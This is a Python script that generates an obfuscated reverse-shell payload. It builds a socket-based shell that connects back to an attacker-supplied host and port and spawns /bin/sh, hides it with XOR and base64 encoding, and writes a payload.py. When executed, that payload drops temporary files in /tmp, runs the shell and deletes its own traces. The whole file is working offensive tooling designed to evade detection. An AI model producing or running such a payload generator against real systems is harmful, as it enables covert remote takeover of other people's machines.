#!/usr/bin/python

'''
./obfu.py <LHOST> <LPORT>
'''
import sys
import string
import random
import base64

LHOST = sys.argv[1]
LPORT = sys.argv[2]


def sxor(s1,s2):
	return ''.join(chr(ord(a)^ord(b)) for a,b in zip(s1,s2))

def genStr(len):
	x = string.ascii_letters
	#x += "1234567890"
	buff = ""
	for i in range(len):
		buff += random.choice(x)
	return buff

# Our basic fucking script
SHELL = "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + LHOST + "\"," + LPORT + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"

# Generate random key
strin = genStr(len(SHELL))

# Xor the string
xored = sxor(SHELL,strin)

# base64 encode the shell
bcode = ''.join(base64.encodestring(xored)[:-1].split("\n"))


# Base64 encode the key
bcode_key = ''.join(base64.encodestring(strin)[:-1].split("\n"))


# Encode xor func
xor = ("def sxor(s1,s2):\n"
"\treturn ''.join(chr(ord(a)^ord(b)) for a,b in zip(s1,s2))\n")
bcode_xor = ''.join(base64.encodestring(xor)[:-1].split("\n"))

payload = "import os,sys\nimport base64\n\nxxd=\"" + bcode_xor + ":" + bcode + ":" + bcode_key + "\".split(\":\")\n" + strin[0:1] + "=base64.decodestring(xxd[0])[:-1]\n" + strin[0:2] + "=\"\\\"\" + xxd[1] + \"\\\"\"\n"+ strin[0:3] + "=\"\\\"\" + base64.decodestring(xxd[2])[:-1] + \"\\\"\"\n\nf=open(\"/tmp/" + strin[8:12] + "\", \"wb\").write(\"from base64 import decodestring\\n\\n\" + " + strin[0:1] + " + \"\\n\\nxrlp=decodestring(\" + " +  strin[0:2] + " + \")\" + \"\\n\\nx=sxor( xrlp,\"+" + strin[0:3] + " + \")\\n\\nprint  x\")\n\nos.system('python /tmp/" + strin[8:12] + " > /tmp/xx11 ')\n\nos.system('rm /tmp/" + strin[8:12] + "')\n\nos.system('python /tmp/xx11')\nos.system('rm /tmp/xx11')\nos.system('rm ' + sys.argv[0])"

open("payload.py","wb").write(payload)

#print payload
